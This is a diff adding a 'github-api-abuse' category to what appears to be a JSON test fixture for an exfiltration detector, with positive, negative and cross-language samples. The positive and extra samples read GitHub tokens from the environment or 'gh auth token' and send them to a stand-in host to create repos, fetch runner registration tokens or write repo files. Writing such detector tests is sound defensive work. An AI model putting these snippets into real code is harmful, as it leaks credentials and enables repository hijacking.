@@ -167,5 +167,31 @@
       ],
       ["go", "t := os.Getenv(\"GH_TOKEN\")\nexec.Command(\"npm\", \"publish\").Run()"]
     ]
+  },
+  "exfiltration/github-api-abuse": {
+    "lang": "js",
+    "pos": [
+      "const gh = process.env.GITHUB_TOKEN;\nawait fetch('https://api.example.invalid/user/repos', { method: 'POST', headers: { authorization: `token ${gh}` }, body });",
+      "const t = execSync('gh auth token').toString().trim();\nawait axios.post(`https://api.example.invalid/repos/${r}/actions/runners/registration-token`, null, { headers: { authorization: `Bearer ${t}` } });"
+    ],
+    "neg": [
+      "const gh = process.env.GITHUB_TOKEN;\nconst res = await fetch(`https://api.example.invalid/repos/${o}/${r}/contents/README.md`, { headers: { authorization: `token ${gh}` } });",
+      "await fetch('https://api.example.invalid/user/repos', { method: 'POST', body });",
+      "const gh = process.env.GITHUB_TOKEN;\nawait fetch(`https://api.example.invalid/repos/${o}/${r}/issues`, { method: 'POST', body });"
+    ],
+    "also": [
+      [
+        "py",
+        "token = os.environ[\"GH_TOKEN\"]\nrequests.put(f\"https://api.example.invalid/repos/{r}/contents/data.json\", headers={\"Authorization\": f\"token {token}\"}, json=body)"
+      ],
+      [
+        "go",
+        "req, _ := http.NewRequest(http.MethodPost, \"https://api.example.invalid/user/repos\", body)\nreq.Header.Set(\"Authorization\", \"token \"+os.Getenv(\"GITHUB_TOKEN\"))"
+      ],
+      [
+        "php",
+        "$t = getenv('GITHUB_TOKEN');\ncurl_setopt($ch, CURLOPT_URL, \"https://api.example.invalid/repos/$r/contents/x.json\");\ncurl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');"
+      ]
+    ]
   }
 }
